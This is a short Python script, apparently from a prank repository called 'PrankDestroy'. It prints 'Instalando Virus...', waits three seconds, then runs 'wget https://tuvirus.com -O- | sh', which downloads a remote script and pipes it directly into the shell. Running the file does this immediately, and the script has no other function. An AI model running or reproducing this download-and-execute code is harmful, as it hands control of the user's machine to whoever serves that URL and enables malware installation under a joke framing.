# Remote Download on host
# By: https://github.com/Br3Fuck/PrankDestroy
# Modulos:

import os
import time

# Clear:

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Remote Download:

def download():
  clear()
  print("Instalando Virus...")
  time.sleep(3)	
  os.system("wget https://tuvirus.com -O- | sh")

# Run:

download()
